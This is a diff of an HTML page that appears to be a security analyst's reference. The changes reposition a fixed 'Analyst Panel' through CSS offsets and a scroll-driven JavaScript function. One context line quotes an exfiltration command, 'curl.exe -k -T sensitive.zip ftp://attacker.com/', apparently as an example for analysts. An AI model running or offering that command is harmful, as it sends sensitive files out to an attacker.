@@ -82,7 +82,7 @@
     .check-if-section ul li::marker { color:#fb923c; }
 
     /* ── Analyst Panel ── */
-    .analyst-panel { position:fixed; right:0; top:60px; width:260px; height:calc(100vh - 60px); background:var(--bg-card); border-left:1px solid var(--border); z-index:80; display:flex; flex-direction:column; overflow:hidden; transition:width .2s; box-shadow:-2px 0 12px rgba(0,0,0,.3); }
+    .analyst-panel { position:fixed; right:0; top:122px; width:260px; height:calc(100vh - 122px); background:var(--bg-card); border-left:1px solid var(--border); z-index:80; display:flex; flex-direction:column; overflow:hidden; transition:width .2s; box-shadow:-2px 0 12px rgba(0,0,0,.3); will-change:top; }
     .analyst-panel.collapsed { width:36px; }
     .analyst-panel__header { padding:.6rem .75rem; border-bottom:1px solid var(--border); display:flex; align-items:center; justify-content:space-between; gap:.5rem; flex-shrink:0; min-height:42px; }
     .analyst-panel__title { font-family:var(--font-mono); font-size:.72rem; color:var(--accent); white-space:nowrap; overflow:hidden; }
@@ -2436,8 +2436,19 @@ curl.exe -k -T sensitive.zip ftp://attacker.com/</div>
     search.addEventListener('input', update);
     update();
 
-    // Analyst panel toggle
+    // Analyst panel toggle + dynamic positioning
     const panel = document.getElementById('analystPanel');
+    const controls = document.querySelector('.cs-controls');
+
+    function positionPanel() {
+      const bottom = controls.getBoundingClientRect().bottom;
+      const top = Math.max(bottom, 122);
+      panel.style.top = top + 'px';
+      panel.style.height = 'calc(100vh - ' + top + 'px)';
+    }
+    window.addEventListener('scroll', positionPanel, { passive: true });
+    positionPanel();
+
     document.getElementById('panelToggle').addEventListener('click', function() {
       const collapsed = panel.classList.toggle('collapsed');
       this.textContent = collapsed ? '+' : '−';
